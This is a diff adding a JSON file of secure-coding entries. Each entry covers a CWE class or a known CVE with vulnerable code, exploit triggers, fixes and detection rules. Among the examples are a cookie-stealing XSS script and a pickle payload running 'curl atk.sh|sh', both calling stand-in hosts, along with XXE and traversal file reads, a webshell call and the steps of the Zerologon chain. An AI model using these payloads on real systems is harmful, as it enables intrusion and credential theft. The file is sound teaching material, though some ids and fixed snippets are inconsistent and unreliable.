@@ -1,0 +1,172 @@
+[
+  {
+    "id": "cwe-78-shellshock",
+    "content": "## CWE-78 — OS Command Injection (CVE-2014-6271 Shellshock)\n\n**Language:** C (GNU Bash)\n**Severity:** CVSS 10.0\n**Primary CWE:** CWE-78\n\n### Vulnerable pattern\n```c\n/* bash ≤ 4.3 parsed function definitions in environment variables\n   and continued to evaluate trailing commands */\nif (strncmp(env_var, \"() {\", 4) == 0) {\n    parse_and_execute(env_var);  /* executes everything after the }; */\n}\n```\n\n### Trigger\n```\nenv X='() { :;}; echo HACKED' bash -c 'echo safe'\n```\nThe `() { :;};` is a valid function definition prefix; the shell continued parsing and executed the trailing `echo HACKED`.\n\n### Fix (bash 4.3 patch level 25)\nRefuse function definitions in environment variables unless they are explicitly wrapped in prefixed variable names like `BASH_FUNC_name%%`. The exported function namespace is segregated from the regular environment.\n\n### Root cause\nTreating attacker-controlled strings (environment variables inherited from CGI requests, SSH ForceCommand, etc.) as code. Classic CWE-78 where the injection sink is the interpreter itself.\n\n### Detection signatures\n- Any use of env strings starting with `() {` in web logs.\n- Snort SID 31978, 31984-31988 cover the public exploit strings.\n- WAF rules matching `^\\(\\)\\s*\\{` on header values.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-78",
+      "cve_id": "CVE-2014-6271",
+      "language": "c",
+      "severity": "critical",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-79-stored-xss-struts",
+    "content": "## CWE-79 — Reflected XSS (generic Node.js / Express)\n\n**Language:** JavaScript\n**Primary CWE:** CWE-79\n\n### Vulnerable pattern\n```js\napp.get('/greet', (req, res) => {\n  res.send(`<h1>Hello, ${req.query.name}</h1>`);  // unescaped\n});\n```\n`/greet?name=<script>fetch('//atk/'+document.cookie)</script>` → payload is reflected into the response unescaped and executes in the victim's browser.\n\n### Fixed pattern\n```js\nimport escapeHtml from 'escape-html';\napp.get('/greet', (req, res) => {\n  res.send(`<h1>Hello, ${escapeHtml(req.query.name)}</h1>`);\n});\n```\nPlus response header `Content-Security-Policy: default-src 'self'; script-src 'self'` as defense-in-depth so even an XSS cannot fetch third-party JS.\n\n### Root cause\nTemplate interpolation without context-aware escaping. Escaping rules differ per sink: HTML body, HTML attribute, JS string literal, URL query component — each needs its own escape function.\n\n### Detection\n- Grep for `innerHTML =` and `dangerouslySetInnerHTML` in code review.\n- Semgrep rule `javascript.express.security.audit.xss.direct-response-write`.\n- Runtime: CSP report-uri collector; monitor for inline-script violations.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-79",
+      "language": "javascript",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-89-sql-injection-python",
+    "content": "## CWE-89 — SQL Injection (Python / psycopg2)\n\n**Language:** Python\n**Primary CWE:** CWE-89\n\n### Vulnerable pattern\n```python\ndef get_user(username: str):\n    cur = conn.cursor()\n    cur.execute(f\"SELECT * FROM users WHERE username = '{username}'\")\n    return cur.fetchone()\n```\n`get_user(\"admin' OR '1'='1\")` returns the first row regardless of credentials. Worse: `get_user(\"' UNION SELECT password FROM secrets --\")` exfiltrates data.\n\n### Fixed pattern\n```python\ndef get_user(username: str):\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM users WHERE username = %s\", (username,))\n    return cur.fetchone()\n```\nThe `%s` is **not** Python string formatting — it's a DB-API placeholder that sends the parameter out-of-band, so no interpolation happens at the query layer.\n\n### Root cause\nString concatenation / f-string interpolation of untrusted input into SQL. The only safe primitive is the driver's parameter binding API.\n\n### Common false fix (still vulnerable)\n```python\ncur.execute(\"SELECT * FROM users WHERE id = %s\" % user_id)  # STILL BAD\n```\nThat's Python's `%` operator, not the DB-API placeholder. It interpolates at Python level before the string ever reaches the DB.\n\n### Detection\n- Semgrep: `python.lang.security.audit.formatted-sql-query`.\n- Django ORM / SQLAlchemy core obviate most occurrences; raw SQL audits remain mandatory.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-89",
+      "language": "python",
+      "severity": "critical",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-22-path-traversal-apache",
+    "content": "## CWE-22 — Path Traversal (CVE-2021-41773 Apache httpd 2.4.49)\n\n**Language:** C (Apache HTTP Server)\n**Severity:** CVSS 7.5 (initial), escalated to RCE when mod_cgi active\n**Primary CWE:** CWE-22 → chained to CWE-78\n\n### Vulnerable code (simplified)\n```c\n/* server/util.c :: ap_normalize_path()\n   Attempt to URL-decode and normalize path segments, but the\n   %2e encoding of '.' was decoded AFTER the traversal check. */\nif (strncmp(path, \"../\", 3) == 0 || strstr(path, \"/../\") != NULL)\n    return HTTP_FORBIDDEN;  /* check happens on pre-decode string */\npath = ap_unescape_url(path);  /* now %2e%2e%2f becomes ../ */\n```\n\n### Exploit\n```\nGET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\n```\nThe `%2e%2e` decodes to `..` only after the sanity check, bypassing the traversal filter. Combined with `mod_cgi` enabled, an attacker can execute `/bin/sh` by traversing to it.\n\n### Fix (2.4.50 / 2.4.51)\nNormalize the path **after** URL-decoding, and reject any path containing `..` segments post-decode. 2.4.50 was also incomplete (CVE-2021-42013); full fix in 2.4.51.\n\n### Detection\n- WAF: reject `%2e%2e`, `%2f%2e%2e` in URIs.\n- IDS: Suricata SID 2034084, Snort SID 58239.\n- Code review: look for canonicalization before or after validation — canonicalize FIRST, always.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-22",
+      "cve_id": "CVE-2021-41773",
+      "language": "c",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-502-deserialization-python-pickle",
+    "content": "## CWE-502 — Unsafe Deserialization (Python pickle)\n\n**Language:** Python\n**Primary CWE:** CWE-502\n\n### Vulnerable pattern\n```python\nimport pickle\n\n@app.route('/restore', methods=['POST'])\ndef restore():\n    state = pickle.loads(request.data)  # accepts attacker-controlled bytes\n    return 'ok'\n```\n`pickle.loads` on untrusted bytes is equivalent to `exec` because the pickle opcodes `R` (REDUCE) and `i`/`c` (GLOBAL) can summon any callable.\n\n### Attack\n```python\nimport pickle, os\nclass Pop: __reduce__ = lambda s: (os.system, ('curl atk.sh|sh',))\npayload = pickle.dumps(Pop())  # POST this to /restore\n```\n\n### Fixed pattern\nUse a format that is not code-equivalent:\n```python\nimport json\n\n@app.route('/restore', methods=['POST'])\ndef restore():\n    state = json.loads(request.data)  # pure data\n    validate_shape(state)\n    return 'ok'\n```\nIf you must keep pickle for internal-only IPC, sign payloads with HMAC and verify before `loads`.\n\n### Sibling risks\n- Java `ObjectInputStream.readObject()` — CVE-2015-4852 (Apache Commons Collections).\n- .NET `BinaryFormatter` — Microsoft deprecated it in .NET 5+ for this reason.\n- PHP `unserialize()` — POP chain abuse (CVE-2017-9841 PHPUnit, CVE-2020-28976 WordPress).\n- YAML `yaml.load()` without `SafeLoader` — CVE-2017-18342 (PyYAML).",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-502",
+      "language": "python",
+      "severity": "critical",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-918-ssrf-metadata",
+    "content": "## CWE-918 — Server-Side Request Forgery (AWS IMDS exfil)\n\n**Language:** Python\n**Primary CWE:** CWE-918\n\n### Vulnerable pattern\n```python\n@app.route('/fetch')\ndef fetch():\n    url = request.args['url']\n    return requests.get(url).text  # no allowlist, no IP filter\n```\n`/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` reads AWS IMDSv1 credentials from inside a VPC instance, returning the role's temporary AK/SK/session-token to the attacker.\n\n### Fixed pattern\n```python\nimport ipaddress\nfrom urllib.parse import urlparse\nimport socket\n\nALLOWED_HOSTS = {'api.partner.example.com'}\n\ndef fetch_safe(url: str) -> str:\n    parsed = urlparse(url)\n    if parsed.scheme not in ('http', 'https'):\n        raise ValueError('scheme not allowed')\n    if parsed.hostname not in ALLOWED_HOSTS:\n        raise ValueError('host not allowed')\n    # resolve and reject private / link-local ranges (TOCTOU-aware)\n    for info in socket.getaddrinfo(parsed.hostname, None):\n        ip = ipaddress.ip_address(info[4][0])\n        if ip.is_private or ip.is_loopback or ip.is_link_local:\n            raise ValueError('resolves to internal address')\n    return requests.get(url, timeout=5).text\n```\n\nBelt-and-suspenders on AWS: migrate to IMDSv2 (token-based, blocks SSRF unless the attacker can also forge the PUT). `aws ec2 modify-instance-metadata-options --http-tokens required`.\n\n### Root cause\nUser-controlled URL + server-side HTTP client + access to privileged internal networks (cloud metadata, internal APIs, databases). Two mitigations must combine: host allowlist AND network egress restrictions.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-918",
+      "language": "python",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-611-xxe-java",
+    "content": "## CWE-611 — XML External Entity (Java / SAX)\n\n**Language:** Java\n**Primary CWE:** CWE-611\n\n### Vulnerable pattern\n```java\nSAXParserFactory f = SAXParserFactory.newInstance();\nSAXParser parser = f.newSAXParser();        // defaults: external entities ENABLED\nparser.parse(request.getInputStream(), handler);\n```\nPayload `<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>` reads arbitrary files.\n\n### Fixed pattern\n```java\nSAXParserFactory f = SAXParserFactory.newInstance();\nf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\nf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\nf.setXIncludeAware(false);\nSAXParser parser = f.newSAXParser();\nparser.parse(request.getInputStream(), handler);\n```\nOWASP maintains the definitive per-parser hardening list; copy-paste from there rather than reinventing.\n\n### Variants\n- Blind XXE: `<!ENTITY % a SYSTEM 'http://atk/'; %a;` — OOB exfil via DNS/HTTP callbacks.\n- Billion-laughs (CWE-776): recursive entity expansion → DoS.\n- SOAP/SAML/RSS consumers: SAML IdP response parsers were historically XXE-prone (CVE-2017-11427 OneLogin).",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-611",
+      "language": "java",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-190-integer-overflow-heartbleed-adjacent",
+    "content": "## CWE-190 — Integer Overflow leading to OOB (Linux kernel)\n\n**Language:** C (Linux kernel — illustrative pattern, many CVEs)\n**Primary CWE:** CWE-190 → CWE-787\n\n### Vulnerable pattern\n```c\nvoid copy_records(struct req *r, size_t count) {\n    size_t bytes = count * sizeof(struct record);  // overflows if count > SIZE_MAX/sizeof\n    void *buf = kmalloc(bytes, GFP_KERNEL);\n    memcpy(buf, r->data, bytes);                    // undersized buf, giant copy\n}\n```\n`count = 0x2000_0001` on a 32-bit arch (sizeof(struct record)=8) → `bytes` wraps to 8, but the loop-variant copy still reads/writes the full `count * 8` bytes.\n\n### Fixed pattern\n```c\n#include <linux/overflow.h>\n\nvoid copy_records(struct req *r, size_t count) {\n    size_t bytes;\n    if (check_mul_overflow(count, sizeof(struct record), &bytes))\n        return -EINVAL;\n    void *buf = kmalloc(bytes, GFP_KERNEL);\n    if (!buf) return -ENOMEM;\n    if (copy_from_user(buf, r->data, bytes))\n        return -EFAULT;\n}\n```\nUse `struct_size()`, `array_size()`, `check_add_overflow()` from `<linux/overflow.h>`. In userland C, use `__builtin_mul_overflow`.\n\n### Pattern prevalence\nnmap / curl / ffmpeg / openssl all have historical CVE-190 entries. Whenever you see `alloc(a * b)`, stop: the multiplication must be overflow-checked.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-190",
+      "language": "c",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-125-heartbleed",
+    "content": "## CWE-125 — Out-of-Bounds Read (CVE-2014-0160 Heartbleed)\n\n**Language:** C (OpenSSL tls1_process_heartbeat)\n**Severity:** CVSS 7.5\n**Primary CWE:** CWE-125\n\n### Vulnerable snippet (pre-fix)\n```c\n/* ssl/d1_both.c */\nunsigned char *p = &s->s3->rrec.data[0], *pl;\nunsigned short hbtype;\nunsigned int payload;\n\nhbtype = *p++;\nn2s(p, payload);        /* payload length read from attacker */\npl = p;\nbuffer = OPENSSL_malloc(1 + 2 + payload + padding);\nbp = buffer;\n*bp++ = TLS1_HB_RESPONSE;\ns2n(payload, bp);\nmemcpy(bp, pl, payload);  /* copies `payload` bytes without verifying\n                             that the record actually contained them */\n```\n\n### Exploit\nSend a heartbeat record whose header claims `payload = 65535` but whose actual body is 1 byte. The server's `memcpy` reads 64 KB past the record into adjacent heap memory, leaking TLS session keys, private keys, and user data.\n\n### Fix (OpenSSL 1.0.1g)\n```c\n/* Check that the message length is sane */\nif (1 + 2 + payload + 16 > s->s3->rrec.length)\n    return 0;  /* silently discard per RFC 6520 */\n```\nValidate attacker-supplied length against the actual record size BEFORE trusting it. The one-line patch is the definitive reminder that `n2s` (network-to-short) returns attacker-controlled values.\n\n### Systemic lesson\nAny code path where `length_from_network_header > actual_buffer_size` is a CWE-125/787 candidate. Audit with the phrase: \"how big does the attacker say this is, and do we cross-check?\"",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-125",
+      "cve_id": "CVE-2014-0160",
+      "language": "c",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-416-use-after-free-linux",
+    "content": "## CWE-416 — Use-After-Free (CVE-2021-22555 Linux netfilter)\n\n**Language:** C (Linux kernel net/netfilter)\n**Severity:** CVSS 7.8 (local root)\n**Primary CWE:** CWE-416\n\n### Root-cause path (simplified)\n```c\n/* net/netfilter/x_tables.c :: xt_compat_target_from_user()\n   Freed match struct was still referenced after kfree(). */\nsize = XT_ALIGN(target->targetsize);\nmemset(dst + usersize, 0, size - usersize);  // out-of-bounds write first\n...\nkfree(match);\nreturn_ptr = &match->something;  // UAF read later\n```\n\nThe combination of a 4-byte OOB write (overwrites adjacent msg_msg chunk) and a reliable UAF gave attackers a full heap-grooming primitive. The public exploit sprayed `msg_msg` objects of a specific size and used the OOB to reshape them, then triggered the UAF read to leak a kernel pointer, then wrote to `modprobe_path` for root.\n\n### Fix\nCommit b29c457a6511 in mainline — tighten the size accounting so the compat layer cannot produce a short-write that leaves stale pointers behind.\n\n### Class-level mitigation\n- CONFIG_STATIC_USERMODEHELPER removes `modprobe_path` as a privesc target.\n- CONFIG_SLAB_FREELIST_HARDENED frustrates heap-grooming primitives.\n- CONFIG_INIT_ON_FREE_DEFAULT_ON zeroes freed memory, weakening UAF-read primitives.\n\n### For auditors\nUAF patterns in C cluster around (a) refcount imbalance, (b) error-path `goto cleanup` that frees and then touches, (c) container teardown order where parent frees before child. Grep for `kfree\\|free\\(` in the function body and trace every use after that point.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-416",
+      "cve_id": "CVE-2021-22555",
+      "language": "c",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-352-csrf-django",
+    "content": "## CWE-352 — Cross-Site Request Forgery (Django missing CSRF)\n\n**Language:** Python (Django)\n**Primary CWE:** CWE-352\n\n### Vulnerable pattern\n```python\nfrom django.views.decorators.csrf import csrf_exempt\n\n@csrf_exempt  # someone disabled CSRF \"just to fix the AJAX\"\ndef transfer(request):\n    if request.method == 'POST':\n        Account.transfer(request.user,\n                         request.POST['to'],\n                         request.POST['amount'])\n```\nAttacker hosts `<form action=\"https://bank/transfer\" method=POST><input name=to value=atk><input name=amount value=9999><script>document.forms[0].submit()</script>` — victim's authenticated session submits the transfer silently.\n\n### Fixed pattern\nRemove `@csrf_exempt`; Django's middleware injects and verifies the CSRF token automatically. For API endpoints consumed by the same site's JS, use Django's built-in `{% csrf_token %}` in templates or `X-CSRFToken` header with the cookie.\n\nFor token-auth APIs (e.g., JWT in Authorization header), CSRF is not applicable — but then every endpoint must verify the Authorization header and reject session-cookie-only requests.\n\n### Modern defense-in-depth\n- `SameSite=Lax` (Chrome default since 2020) breaks most trivial CSRF.\n- `SameSite=Strict` for high-sensitivity cookies.\n- Double-submit cookie pattern as a library-agnostic fallback.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-352",
+      "language": "python",
+      "severity": "medium",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-434-unrestricted-upload",
+    "content": "## CWE-434 — Unrestricted File Upload (PHP)\n\n**Language:** PHP\n**Primary CWE:** CWE-434 → CWE-78 when chained with webserver parser\n\n### Vulnerable pattern\n```php\n<?php\n$target = 'uploads/' . basename($_FILES['file']['name']);\nmove_uploaded_file($_FILES['file']['tmp_name'], $target);\necho \"Saved to $target\";\n```\nNo type / extension / content check. Attacker uploads `shell.php`, then browses `/uploads/shell.php?cmd=id` → RCE because Apache's `AddHandler` routes `.php` into the PHP interpreter regardless of upload origin.\n\n### Fixed pattern\n```php\n<?php\n$allowed = ['image/png' => 'png', 'image/jpeg' => 'jpg'];\n$info = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($info, $_FILES['file']['tmp_name']);\nif (!isset($allowed[$mime])) {\n    http_response_code(415); exit('type not allowed');\n}\n$ext = $allowed[$mime];\n$name = bin2hex(random_bytes(16)) . '.' . $ext;\n$target = __DIR__ . '/uploads/' . $name;          // server-chosen name\nmove_uploaded_file($_FILES['file']['tmp_name'], $target);\n```\n\nSupplementary webserver hardening — so even a bypass doesn't execute:\n```apache\n<Directory \"/var/www/uploads\">\n    php_admin_flag engine off\n    SetHandler none\n    RemoveHandler .php .phtml\n    AddType text/plain .php .phtml .phar\n</Directory>\n```\n\n### Common bypass patterns to test for\n- Double extensions: `shell.php.jpg` on misconfigured Apache `mod_mime`.\n- Null-byte: `shell.php%00.jpg` (CVE-2006-7243-era PHP).\n- Polyglot GIFs that are valid PHP (GIF89a header + PHP body).\n- `.htaccess` upload to add handlers in the upload dir.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-434",
+      "language": "php",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-798-hardcoded-credentials",
+    "content": "## CWE-798 — Use of Hardcoded Credentials\n\n**Language:** various\n**Primary CWE:** CWE-798\n\n### Vulnerable pattern (Python)\n```python\n# settings.py\nAWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'\nAWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\nDB_PASSWORD = 'p4$$w0rd'\n```\nEveryone with repo read gets prod credentials. `git log -p` leaks rotation history. SaaS scanners (GitGuardian, TruffleHog) find these in public forks minutes after push.\n\n### Fixed pattern\n```python\nimport os\nAWS_ACCESS_KEY_ID = os.environ['AWS_ACCESS_KEY_ID']            # fail fast if absent\nAWS_SECRET_ACCESS_KEY = os.environ['AWS_SECRET_ACCESS_KEY']\nDB_PASSWORD = os.environ['DB_PASSWORD']\n```\nSecrets live in the deploy platform's secret store (AWS Secrets Manager, Vault, Doppler, K8s Secrets + SealedSecrets). Rotation is a single operation, not a code change.\n\n### Prevention\n- Pre-commit hook: `gitleaks protect --staged` rejects commits that match the common-secret regexes.\n- CI: `trufflehog git file://.` as a fail-closed gate.\n- In the repo: always commit a `.env.example` with placeholder keys, never the real `.env`.\n- When a secret leaks: rotate immediately, then remove from history (`git filter-repo` or BFG). History rewrites don't help once it's public — rotation is the only durable fix.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-798",
+      "language": "any",
+      "severity": "high",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-287-authentication-bypass-zerologon",
+    "content": "## CWE-287 — Authentication Bypass (CVE-2020-1472 Zerologon)\n\n**Language:** protocol-level (MS-NRPC over SMB)\n**Severity:** CVSS 10.0\n**Primary CWE:** CWE-287 (crypto-induced auth bypass)\n\n### Root cause\nNetlogon uses AES-CFB8 to authenticate the ComputeNetlogonCredential handshake. With CFB8, if the attacker-controlled challenge is all zeros AND the IV is all zeros, the probability that the ciphertext's first byte is zero is 1/256 — so after ~256 tries on average, a fully zero ciphertext validates.\n\nThe spec allowed zero IVs. The client challenge was attacker-controlled. The server had no rate limiting on NRPC login attempts.\n\n### Exploit chain\n1. Attacker establishes NRPC channel as the Domain Controller's own machine account.\n2. Sends zero-challenge + zero-credential until one of ~256 attempts succeeds.\n3. Resets the DC's machine account password to empty.\n4. Uses the now-empty DC password with `secretsdump.py` to dump NTDS.dit → full domain compromise.\n\nTotal time: ~3 seconds on a LAN.\n\n### Fix\n- KB4556836 (Aug 2020) enforces Secure RPC for machine accounts; non-compliant clients are rejected.\n- February 2021 enforcement phase made Secure RPC mandatory.\n\n### Lessons for auditors\n- Every symmetric cipher's block mode has edge cases; CFB8 with known IV has specific weaknesses.\n- Absence of rate-limiting on authentication primitives is always a CWE-307/287 finding.\n- Machine accounts are as powerful as user accounts — treat them with the same rigor.",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-287",
+      "cve_id": "CVE-2020-1472",
+      "language": "protocol",
+      "severity": "critical",
+      "type": "cwe-example"
+    }
+  },
+  {
+    "id": "cwe-476-null-deref-linux",
+    "content": "## CWE-476 — NULL Pointer Dereference (C, idiomatic)\n\n**Language:** C\n**Primary CWE:** CWE-476\n\n### Vulnerable pattern\n```c\nstruct conn *c = find_conn(sock);   // returns NULL when lookup fails\nc->state = STATE_ACTIVE;             // NULL deref → DoS (kernel panic or SIGSEGV)\n```\n\n### Fixed pattern\n```c\nstruct conn *c = find_conn(sock);\nif (!c)\n    return -ENOENT;\nc->state = STATE_ACTIVE;\n```\n\n### Why it matters\nIn userland, a NULL deref is a local DoS (segfault). In kernel code, it is a remote DoS (oops/panic → reboot → possible privilege escalation if paired with a side-channel). In security-critical services (sshd, nginx, db servers) it means restart loops and lockout.\n\n### Audit heuristics\n- Every function returning a pointer documents its failure mode — check the doc comment.\n- `malloc`, `kmalloc`, `kzalloc`, `strdup`, `fopen`, `socket`, `accept`, `listxattr`, container iterator macros — all can fail.\n- `container_of()` returns garbage if its input is NULL — the result dereferences unpredictably.\n- Error-path `goto cleanup;` that touches pointers set only on success is a common variant.\n\n### Sibling CWEs for triage\nA NULL deref caused by an attacker-influenced state-machine path ladders up to CWE-617 (Reachable Assertion) or CWE-20 (Improper Input Validation). The check is: \"can the attacker provoke the NULL path remotely?\"",
+    "metadata": {
+      "source": "cwe-examples",
+      "cwe_id": "CWE-476",
+      "language": "c",
+      "severity": "medium",
+      "type": "cwe-example"
+    }
+  }
+]
